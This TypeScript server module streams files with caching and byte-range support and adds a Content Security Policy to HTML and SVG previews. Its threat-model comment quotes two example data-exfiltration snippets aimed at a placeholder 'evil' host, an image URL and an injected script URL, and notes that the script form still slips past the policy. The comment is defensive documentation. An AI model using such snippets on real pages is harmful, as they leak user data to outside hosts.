/*
 * Copyright Maner·Fan
 *
 * Licensed under the Apache License, Version 2.0 (the "License");
 * you may not use this file except in compliance with the License.
 * You may obtain a copy of the License at
 *
 *     https://www.apache.org/licenses/LICENSE-2.0
 *
 * Unless required by applicable law or agreed to in writing, software
 * distributed under the License is distributed on an "AS IS" BASIS,
 * WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
 * See the License for the specific language governing permissions and
 * limitations under the License.
 */

import type { Context } from 'hono'
import { stream } from 'hono/streaming'
import { basename } from 'node:path'
import { RPC_BINARY_CHUNK_SIZE } from '@mobi/shared'
import type { ReadFileMetaResponse, RpcReadFileRangeResponse } from '@mobi/shared/fileMeta'
import { daemonLogger } from '../../logger'

/**
 * 文件内容读取器：session 通道（sessionId 寻址）与 machine 通道（machineId+cwd 寻址）的公共面。
 * serveFileContent 只依赖此抽象——meta→304→Range→stream 等机制层逻辑对两种寻址完全复用。
 * 响应形状单源在 shared（ReadFileMetaResponse / RpcReadFileRangeResponse）。
 */
export interface FileContentReader {
    readFileMeta(path: string): Promise<ReadFileMetaResponse>
    readFileRange(path: string, offset: number, length: number): Promise<RpcReadFileRangeResponse>
}

/**
 * mobi 服务的一切可执行文档（text/html 与 image/svg+xml——svg 可内嵌脚本）统一注入的
 * CSP（与通道无关：serve-file 预览 / read-file 浏览器打开 / machine 通道，全部经
 * serveFileContent 恒注）。
 *
 * 威胁模型：模型/机器侧产出的 HTML 若在 daemon 同源顶层执行（产物卡「浏览器打开」「复制链接」、
 * 预览），脚本将自带 httpOnly cookie 可自由调 mobi API。CSP 把能力面收窄：
 *   - script/style/font 'self' + https:  → 支持同目录文件与外部 CDN，'unsafe-inline' 兼容行内
 *     <script>/<style>（产物页常规形态）
 *   - img/media 'self' + data:           → 禁外链图片，堵 `<img src=https://evil/?data>` GET 外带
 *   - connect-src 'none'                 → 禁所有 fetch/XHR/sendBeacon/WebSocket，
 *     脚本无法以用户身份调 mobi API，也无法把数据 POST 到外部
 *   - form-action 'none' / base-uri 'none' / object-src 'none' / frame-src 'none'
 * 配套：serve-file 通道另有 iframe sandbox（allow-scripts allow-same-origin）——sandbox 挂在
 * iframe 标签上不随 URL 走，top-level 打开（浏览器打开通道）只剩 CSP 单道防线，属已接受取舍。
 * 残留面：动态 createElement('script').src='https://evil/?data' 这类「把数据拼进资源 URL」的
 * 外带仍可绕过（凡允许外链资源加载即无法根治）；但 mobi 凭证走 httpOnly cookie、localStorage
 * 不放 token，外带仅限 recent-paths/偏好等低价值 PII。安全论断单源本处（ADR 0007）。
 */
export const PREVIEW_CSP = [
    "default-src 'none'",
    "script-src 'self' https: 'unsafe-inline'",
    "style-src 'self' https: 'unsafe-inline'",
    "img-src 'self' data:",
    "font-src 'self' https: data:",
    "media-src 'self' data:",
    "connect-src 'none'",
    "form-action 'none'",
    "base-uri 'none'",
    "frame-ancestors 'self'",
    "object-src 'none'",
    "frame-src 'none'",
].join('; ')

interface ServeOptions {
    /** 下载场景（read-file 的 download=1）：追加 attachment content-disposition */
    download?: boolean
    /** 额外响应头（serve-file 用于追加 x-content-type-options: nosniff） */
    extraHeaders?: Record<string, string>
}

/**
 * CLI 文件 meta 结构化错误码 → HTTP 状态码（单点映射，file-meta 与 serveFileContent 共用）。
 * 'ENOENT' → 404（对 iframe 友好，浏览器渲染原生缺页而非崩溃）；
 * 'ACCESS_DENIED' → 403（读边界拒绝，真实原因随 body 下发给前端展示）；
 * 其他（含 'EXT_FORBIDDEN'，machine 通道扩展名拒绝）→ 500。
 */
export function fileMetaHttpStatus(code?: string): 404 | 403 | 500 {
    if (code === 'ENOENT') return 404
    if (code === 'ACCESS_DENIED') return 403
    return 500
}

/**
 * 从 read-file 抽出的共享文件服务逻辑：吃绝对路径，输出流式响应。
 * 流程：readFileMeta → 304 协商缓存 → Range(206) 解析 → 响应头 → stream 分片翻译。
 * read-file（单文件读取/下载）与 serve-file（HTML 预览静态资源）共用，避免复制粘贴。
 *
 * meta 读取失败的状态码分流见 {@link fileMetaHttpStatus}。
 */
export async function serveFileContent(
    c: Context,
    reader: FileContentReader,
    absPath: string,
    opts: ServeOptions = {},
): Promise<Response> {
    const meta = await reader.readFileMeta(absPath)
    // 精确 union（深化候选②票②）：失败分支 meta 恒缺、error/code 恒在，无需再判 meta.meta
    if (!meta.success) {
        return c.json({ success: false, error: meta.error ?? 'Failed to read file meta' }, fileMetaHttpStatus(meta.code))
    }
    const { mime, size, etag } = meta.meta

    // 协商缓存：etag 命中直接返回空体
    if (c.req.header('if-none-match') === etag) {
        return new Response(null, { status: 304, headers: { etag } })
    }

    // Range 解析（RFC 7233 三种形式）：
    //   bytes=start-end  区间
    //   bytes=start-     从 start 到末尾
    //   bytes=-N         最后 N 字节（suffix，浏览器读 mp4 尾部 moov 时常用）
    let start = 0
    let end = size - 1
    let isRange = false
    const rangeHeader = c.req.header('range')
    if (rangeHeader) {
        const m = /^bytes=(\d*)-(\d*)$/.exec(rangeHeader)
        const firstPos = m?.[1]
        const lastPos = m?.[2]
        if (m && (firstPos || lastPos)) {
            if (firstPos) {
                // bytes=start-end / bytes=start-
                start = Number(firstPos)
                if (lastPos) {
                    end = Number(lastPos)
                }
                isRange = true
            } else if (Number(lastPos) > 0) {
                // bytes=-N（suffix）：最后 N 字节；N ≥ size 时回退为整个文件
                start = Math.max(0, size - Number(lastPos))
                end = size - 1
                isRange = true
            }
        }
        // 越界或非法区间：416
        if (!isRange || start > end || start >= size) {
            return new Response(null, {
                status: 416,
                headers: { 'content-range': `bytes */${size}` },
            })
        }
        // end 不超过文件末尾
        if (end >= size) {
            end = size - 1
        }
    }

    // 响应头：stream() 内部最终以 c.newResponse(readable) 收尾，
    // 此前用 c.header()/c.status() 设置的头与状态会被透传
    c.header('content-type', mime)
    c.header('content-length', String(end - start + 1))
    c.header('etag', etag)
    c.header('accept-ranges', 'bytes')
    c.header('cache-control', 'private, no-cache')
    // 可执行文档恒注 CSP（通道无关的不变量，capability face 见 PREVIEW_CSP 注释）：
    // text/html 之外 image/svg+xml 同样可内嵌 <script>，顶层打开（复制链接/浏览器打开）
    // 与 HTML 同威胁模型；其余 mime（png/mp4/css 子资源等）不注入。
    if (mime === 'text/html' || mime === 'image/svg+xml') {
        c.header('content-security-policy', PREVIEW_CSP)
    }
    if (opts.extraHeaders) {
        for (const [k, v] of Object.entries(opts.extraHeaders)) {
            c.header(k, v)
        }
    }
    if (isRange) {
        c.header('content-range', `bytes ${start}-${end}/${size}`)
    }
    if (opts.download) {
        const safeName = encodeURIComponent(basename(absPath))
        // RFC 5987：filename* 优先供现代浏览器解码中文文件名，filename 为 ASCII 兼容兜底
        c.header('content-disposition', `attachment; filename="${safeName}"; filename*=UTF-8''${safeName}`)
    }
    c.status(isRange ? 206 : 200)

    // 流式翻译：循环 readFileRange 分片读取
    // 背压：正常消费时 TransformStream writer.write 提供天然背压（web 消费慢 → readable 不读
    // → writable queue 满 → write 的 Promise 不 resolve → 循环暂停）。
    // 但 hono StreamingApi.write 内部吞掉所有异常，客户端断开后 write 仍立即 resolve，
    // 背压失效——靠循环内 s.aborted/s.closed 检查兜底，避免空转把剩余文件全量拉进内存丢弃。
    const CHUNK = RPC_BINARY_CHUNK_SIZE
    return stream(c, async (s) => {
        let offset = start
        while (offset <= end) {
            // 客户端断开（abort/close）及时停止
            if (s.aborted || s.closed) {
                break
            }
            const len = Math.min(CHUNK, end - offset + 1)
            const r = await reader.readFileRange(absPath, offset, len)
            // 运行时守卫兜底：daemon↔CLI 响应经 rpcGateway 类型 cast、无运行时校验，
            // 版本偏斜的 CLI 返回 success 但缺 chunk 时干净截断而非静默 TypeError
            if (!r.success || !r.chunk) {
                // 流中失败只能截断（响应头已随 stream 发出，状态码不可再改）；
                // code（如 meta 读取后文件被并发删除的 ENOENT）落日志供观测
                const detail = r.success
                    ? 'success response without chunk'
                    : `${r.error}${r.code ? ` (${r.code})` : ''}`
                daemonLogger.warn(`[serveFileContent] readFileRange failed: ${detail}`)
                break
            }
            await s.write(r.chunk)
            offset += r.chunk.byteLength
        }
    })
}
